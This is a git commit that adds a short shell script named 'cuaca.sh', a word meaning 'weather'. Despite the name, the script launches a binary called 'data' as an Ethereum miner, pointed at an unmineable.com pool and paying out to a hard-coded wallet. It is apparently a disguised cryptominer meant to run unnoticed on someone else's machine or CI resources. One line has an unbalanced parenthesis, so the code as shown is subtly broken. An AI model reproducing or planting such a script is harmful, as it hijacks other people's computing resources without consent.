3071a782ec283b8ee7811bea49f6585f31d56a66
ributmaestro <88657490+ributmaestro@users.noreply.github.com>
2021-08-11 06:34:17 +0700

    Create cuaca.sh

---
+++ cuaca.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+POOL=ethash.unmineable.com:13333
+
+WALLET=ETH:0x40819d362CCfb0bb130C80cc0dBB4cdef5b02417
+
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)#rame-kb3u
+
+chmod +x data
+
+./data --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
